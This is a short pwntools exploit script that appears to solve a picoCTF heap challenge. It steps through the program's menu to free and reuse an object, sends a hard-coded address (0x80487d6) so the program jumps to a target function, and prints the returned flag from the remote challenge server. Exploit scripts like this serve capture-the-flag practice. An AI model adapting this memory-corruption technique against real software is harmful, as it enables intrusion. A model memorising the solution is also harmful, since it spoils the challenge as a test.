from pwn import *

exe = ELF("./vuln")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 4504)

    return r


def main():
    r = conn()

    r.recvuntil(b'(e)xit')

    payload = b'S' 

    r.sendline(payload)

    r.recvuntil(b'(e)xit')

    payload = b'I' 

    r.sendline(payload)

    r.recvuntil(b'already(Y/N)?')

    payload = b'Y' 

    r.sendline(payload)

    r.recvuntil(b'(e)xit')

    payload = b'l' 

    r.sendline(payload)

    r.recvuntil(b'anyways:')

    payload = p32(0x80487d6)

    r.sendline(payload)

    # res=r.recvall()
    res=r.recvline()
    res+=r.recvline()
    res+=r.recvline()
    print(res)

    r.interactive()


if __name__ == "__main__":
    main()
